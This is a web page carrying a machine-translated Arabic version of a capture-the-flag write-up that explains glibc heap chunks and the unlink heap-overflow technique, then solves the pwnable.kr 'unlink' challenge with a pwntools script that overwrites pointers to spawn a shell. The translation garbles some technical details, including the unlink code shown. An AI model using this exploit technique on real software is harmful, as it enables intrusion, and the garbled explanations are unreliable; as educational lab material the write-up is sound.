<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👡 🧔 🈵 حل المشكلات باستخدام pwnable.kr 19 - إلغاء الارتباط. تجاوز سعة المخزن المؤقت كومة الذاكرة المؤقتة 👨‍👨‍👧‍👧 🏴󠁧󠁢󠁥󠁮󠁧󠁿 👈</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="في هذه المقالة ، سوف نتعامل مع مشكلة عدم حصانة تجاوز سعة المخزن المؤقت في الكومة ، وكذلك حل المهمة التاسعة عشرة من موقع pwnable.kr . 

 المعلومات التن...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>حل المشكلات باستخدام pwnable.kr 19 - إلغاء الارتباط. تجاوز سعة المخزن المؤقت كومة الذاكرة المؤقتة</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/463227/" style=";text-align:right;direction:rtl"><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="صورة"></div><br>  في هذه المقالة ، سوف نتعامل مع مشكلة عدم حصانة تجاوز سعة المخزن المؤقت في الكومة ، وكذلك حل المهمة التاسعة عشرة من موقع <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">pwnable.kr</a> . <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">المعلومات التنظيمية</b> <div class="spoiler_text" style=";text-align:right;direction:rtl">  خاصةً لأولئك الذين يرغبون في تعلم شيء جديد وتطويره في أي من مجالات أمن المعلومات والحاسوب ، سأكتب وأتحدث عن الفئات التالية: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  PWN. </li><li style=";text-align:right;direction:rtl">  التشفير (التشفير) ؛ </li><li style=";text-align:right;direction:rtl">  تقنيات الشبكات (الشبكة) ؛ </li><li style=";text-align:right;direction:rtl">  عكس (الهندسة العكسية) ؛ </li><li style=";text-align:right;direction:rtl">  إخفاء المعلومات (Stegano) ؛ </li><li style=";text-align:right;direction:rtl">  بحث واستغلال مواطن الضعف WEB. </li></ul><br>  بالإضافة إلى ذلك ، سوف أشارك تجربتي في الطب الشرعي للكمبيوتر ، وتحليل البرامج الضارة والبرامج الثابتة ، والهجمات على الشبكات اللاسلكية وشبكات المناطق المحلية ، وإجراء عمليات pentests واستغلال الكتابة. <br><a name="habracut"></a><br>  حتى تتمكن من معرفة المقالات الجديدة والبرامج والمعلومات الأخرى ، أنشأت <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">قناة في Telegram</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ومجموعة لمناقشة أي مشاكل</a> في مجال التصنيف الدولي للأمراض.  أيضًا ، سأدرس شخصيًا طلباتك الشخصية وأسئلتك واقتراحاتك وتوصياتك <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">شخصيًا وسأجيب على الجميع</a> . <br><cut></cut><br>  يتم توفير جميع المعلومات للأغراض التعليمية فقط.  لا يتحمل مؤلف هذا المستند أية مسؤولية عن أي ضرر يلحق بشخص ما نتيجة استخدام المعرفة والأساليب التي تم الحصول عليها نتيجة لدراسة هذا المستند. <br></div></div><br><h2 style=";text-align:right;direction:rtl">  كيف يتم تنظيم حفنة </h2><br>  يمكن أن تكون الذاكرة مشغولة (مخصصة) ومجانية.  يوضح الشكل الذاكرة الديناميكية. <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  SSize - حجم كتلة الذاكرة السابقة ، بشرط أن يكون مجانيًا. </li><li style=";text-align:right;direction:rtl">  الحجم - حجم كتلة الذاكرة المعينة ، والتي تضاف إليها بتتان الحالة. </li><li style=";text-align:right;direction:rtl">  بيانات - بيانات المستخدم. </li><li style=";text-align:right;direction:rtl">  Fd هو مؤشر إلى الكتلة المجانية التالية. </li><li style=";text-align:right;direction:rtl">  Bk - مؤشر إلى الكتلة الحرة السابقة. </li><li style=";text-align:right;direction:rtl">  ذاكرة خالية من. </li></ul><br><img src="https://habrastorage.org/webt/od/l8/wl/odl8wldwtep38idb6xl7mo0xomo.png" alt="صورة"><br><cut></cut><br>  وبالتالي ، لا يمكن أن يكون اثنين من كتل الحرة الجيران.  بالإضافة إلى ذلك ، على حدود ذاكرة النظام المشغولة والمجانية ، هناك كتلة W خالية مُعدة خصيصًا. <br><br><img src="https://habrastorage.org/webt/g7/me/mj/g7memj23astzelqipouglqcyryo.png" alt="صورة"><br><br>  تمثيل الكتل في القوائم (السلال) كما يلي. <br><br><img src="https://habrastorage.org/webt/si/nb/zi/sinbzijmqm41pmtlvznicjwqsig.png" alt="صورة"><br><br>  يتم استخدام طريقة إلغاء الربط لإزالة كتلة خالية من القائمة. <br><pre style=";text-align:right;direction:rtl"><code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">unlink</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(S, BK, FD)</span></span></span></span>{ BK = S-&gt;bk; FD = S-&gt;fd; FD-&gt;bk=BK; FD-&gt;fd=FD; }</code> </pre> <br><h2 style=";text-align:right;direction:rtl">  تخصيص وإطلاق الذاكرة </h2><br>  دعونا نرى كيف يعمل MMAP.  في الخطوة الأولى ، يتم فحص صفائف الأحجام المطلوبة (على سبيل المثال ، 24 بايت).  إذا كان هناك كتلة ضرورية ، فسيتم فصلها باستخدام إلغاء الربط. <br><br><img src="https://habrastorage.org/webt/1l/ia/1g/1lia1gy8vhckf3btuyuuipxwrvs.png" alt="صورة"><br><br>  في الخطوة الثانية ، إذا كانت هذه الكتلة كبيرة بدرجة كافية ، يتم تقسيمها إلى قسمين.  يتم تخصيص الجزء الأول ، ويتم إعادة توزيع الجزء الثاني إلى مجموعة أخرى. <br><br><img src="https://habrastorage.org/webt/tn/0g/dz/tn0gdz_2jn5pxabh-bmqe85sllw.png" alt="صورة"><br><br>  في الخطوة الثالثة ، إذا لم يتم تخصيص كتلة الحجم المطلوب ، فسيتم فحص الكتلة W.  إذا كان يرضى ، ثم يتم إجراء الخطوات الثانية معه.  إذا كانت الكتلة W صغيرة ، فسيتم استخدام sbrk () و mmap () لتوسيع الذاكرة المتوفرة.  الطريقة الحرة هي عكس تماما ل MMAP. <br><br><h2 style=";text-align:right;direction:rtl">  تجاوز سعة المخزن المؤقت كومة الذاكرة المؤقتة </h2><br>  تجاوز سعة كومة الذاكرة المؤقتة هو نوع من سعة تجاوز سعة المخزن المؤقت الذي يحدث في منطقة بيانات كومة الذاكرة المؤقتة.  يتم تخصيص الذاكرة على الكومة بشكل حيوي بواسطة التطبيق في وقت التشغيل وعادة ما تحتوي على بيانات البرنامج.  يتم إجراء الاستغلال عن طريق إتلاف هذه البيانات بطريقة خاصة بحيث يقوم التطبيق بالكتابة فوق الهياكل الداخلية ، مثل المؤشرات إلى قائمة مرتبطة.  الأسلوب تجاوز سعة الكومة الكنسي الكتابة فوق علاقة تخصيص الذاكرة الديناميكية (على سبيل المثال ، بيانات التعريف malloc) ويستخدم تبادل المؤشر لإعادة كتابة مؤشر إلى دالة برنامج. <br><br>  على سبيل المثال ، في وظيفة Unlink ، باستخدام FD-&gt; bk ، يمكنك تغيير قيمة كلمة تعسفية في الذاكرة.  على سبيل المثال ، ضع كود القشرة لتغيير عنوان GOT.  مثال على الفائض سيكون مثالاً. <br><br><h2 style=";text-align:right;direction:rtl">  حل وظيفة الحل </h2><br>  نضغط على الرمز الأول مع إلغاء ربط التوقيع ، وقيل لنا إننا بحاجة إلى الاتصال عبر SSH بضيف كلمة المرور. <br><br><img src="https://habrastorage.org/webt/jz/as/1x/jzas1xaqekf5eq9erbqm5njrwsc.png" alt="صورة"><br><br>  عند الاتصال ، نرى الشعار المقابل. <br><br><img src="https://habrastorage.org/webt/ys/ez/1q/ysez1qokcr1rmiop8umaw7xsydy.png" alt="صورة"><br><br>  دعونا نعرف ما هي الملفات الموجودة على الخادم ، وكذلك ما هي الحقوق التي لدينا. <br><br><img src="https://habrastorage.org/webt/tr/_f/ax/tr_faxkgym1_ffnyi2dhf4pyeui.png" alt="صورة"><br><br>  دعنا نرى الكود المصدري. <br><br><img src="https://habrastorage.org/webt/xl/w_/ov/xlw_ovk-ykliwdgmzemsutj740m.png" alt="صورة"><br><br>  لذلك لدينا كائن B مرتبط بالكائنات A و C. ثم يتم إدخال وتعبئة الكائن A. ، وبعد توصيل الكائنات A - B - C والتحكم في ملء A ، يمكننا تجاوز الكومة وإعادة كتابة الكائنات B و C. نحن بحاجة إلى إيجاد طريقة لاستغلال الثغرة الأمنية.  دعونا ننظر من خلال gdb. <br><br><img src="https://habrastorage.org/webt/c3/pz/mn/c3pzmn74gtqxoadbjt3uoo-vyru.png" alt="صورة"><br><br>  وبالتالي ، يمكنك كتابة كود القشرة وإعادة كتابة عنوان المرسل من الرئيسي إلى كود القشرة لدينا.  يقع عنوان المرسل في esp من سجل ecx ، حيث يتغذى من ebp-4.  عند تفكيك وظيفة إلغاء الربط ، نلاحظ أنه يمكن التحكم في ebp-4 عن طريق إدخال المستخدم. <br><br><img src="https://habrastorage.org/webt/yk/wr/vs/ykwrvs0tnxcx-baddh99o7iv4eq.png" alt="صورة"><br><br>  دعونا نرى كيف توجد كائناتنا في الذاكرة وكيف تعمل وظيفة إلغاء الربط.  يشغل كل كائن 16 بايت في الذاكرة (4 للمؤشرات و 8 للمخازن المؤقتة). <br><br><img src="https://habrastorage.org/webt/o-/bd/gj/o-bdgjsoyb4cgj_wqd_h7ce6vkc.png" alt="صورة"><br><br>  يحدث تخصيص الذاكرة للكائنات في الأسطر main + 38 و main + 54 و main + 70.  قبل كل مكالمة ، يزيد مؤشر المكدس (esp) بمقدار 16 وينخفض ​​بمقدار 12 ، وبعد ذلك يتم حجز 16 بايت. <br><br><img src="https://habrastorage.org/webt/64/s2/g3/64s2g3u8ol_xinrsp-eua8gibfo.png" alt="صورة"><br><br><img src="https://habrastorage.org/webt/ba/y5/b7/bay5b7cq9wmxel5juyrrfzkiaqu.png" alt="صورة"><br><br>  وهذا هو ، هناك 4 بايت بين الهياكل. <br><br><img src="https://habrastorage.org/webt/me/4e/qx/me4eqxnvxygpcp_n5ohygmkwomi.png" alt="صورة"><br><br>  التالي هو ربط وربط الأشياء. <br><br><img src="https://habrastorage.org/webt/y3/nd/vu/y3ndvuyo9euui4ip_ktetucknsa.png" alt="صورة"><br><br><img src="https://habrastorage.org/webt/rj/aw/0l/rjaw0lfmf7sycqabk3zlcziok4i.png" alt="صورة"><br><br>  وبالتالي ، نحتاج إلى أنه عند الرجوع من الوظيفة ، سينتقل العنوان إلى كومة الموقع + 12 ، والتي ستنقل التحكم إلى العنوان الذي يوجد به كود القشرة. <br><br><img src="https://habrastorage.org/webt/sn/ex/nd/snexnd9lwel8-cv1gxcnee1-wvg.png" alt="صورة"><br><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * s = ssh(<span class="hljs-string"><span class="hljs-string">"unlink"</span></span>, <span class="hljs-string"><span class="hljs-string">"pwnable.kr"</span></span>, password=<span class="hljs-string"><span class="hljs-string">"guest"</span></span>, port=<span class="hljs-number"><span class="hljs-number">2222</span></span>) ex = s.process(<span class="hljs-string"><span class="hljs-string">"./unlink"</span></span>) shell_address = p32(<span class="hljs-number"><span class="hljs-number">0x80484eb</span></span>) ans = ex.recv().split(<span class="hljs-string"><span class="hljs-string">"\n"</span></span>) stack_addr = p32(int(ans[<span class="hljs-number"><span class="hljs-number">0</span></span>].split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">5</span></span>],<span class="hljs-number"><span class="hljs-number">16</span></span>) + <span class="hljs-number"><span class="hljs-number">16</span></span>) heap_addr = p32(int(ans[<span class="hljs-number"><span class="hljs-number">1</span></span>].split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">5</span></span>],<span class="hljs-number"><span class="hljs-number">16</span></span>) + <span class="hljs-number"><span class="hljs-number">12</span></span>) payload = shell_address + <span class="hljs-string"><span class="hljs-string">"A"</span></span>*<span class="hljs-number"><span class="hljs-number">12</span></span> + heap_addr + stack_addr ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/bf/ve/wv/bfvewvnmhb4ncoo4uwc5rvrrqss.png" alt="صورة"><br><br>  نحصل على قذيفة ، وقراءة العلم ، والحصول على 10 نقطة. <br><br><img src="https://habrastorage.org/webt/cn/jm/cg/cnjmcgkhpj7_lzlu2eht9odbjga.png"><br><br>  يمكنك الانضمام إلينا على <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Telegram</a> .  في المرة القادمة سوف نتعامل مع تجاوز سعة الكومة. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar463227/">https://habr.com/ru/post/ar463227/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar463203/index.html">عبء الوقت الثقيل. تقرير ياندكس عن الأخطاء الشائعة في العمل مع الوقت</a></li>
<li><a href="../ar463205/index.html">لا يمكن تشغيله في البداية: كيفية البقاء على قيد الحياة باستخدام كمبيوتر محمول على نظام التشغيل Windows 10 ومحرك أقراص سعة 32 جيجابايت</a></li>
<li><a href="../ar463207/index.html">تطوير Chatbot (telegram + youtube)</a></li>
<li><a href="../ar463213/index.html">المفاهيم الخاطئة للمطورين المبتدئين C #. محاولة للإجابة على الأسئلة القياسية</a></li>
<li><a href="../ar463225/index.html">واي فاي المؤسسة. FreeRadius + FreeIPA + Ubiquiti</a></li>
<li><a href="../ar463229/index.html">Jetpacks في الثقافة: السينما</a></li>
<li><a href="../ar463231/index.html">تدريب Cisco 200-125 CCNA v3.0. يوم 14. VTP ، تشذيب ، والشبكة المحلية الظاهرية المحلية</a></li>
<li><a href="../ar463233/index.html">تدريب Cisco 200-125 CCNA v3.0. يوم 15. تباطؤ الاتصالات وأمن الموانئ</a></li>
<li><a href="../ar463237/index.html">كيف لعبنا الموسيقى مع الشبكات العصبية v 2.0</a></li>
<li><a href="../ar463239/index.html">22 أغسطس - Alfa JS MeetUP SPb</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>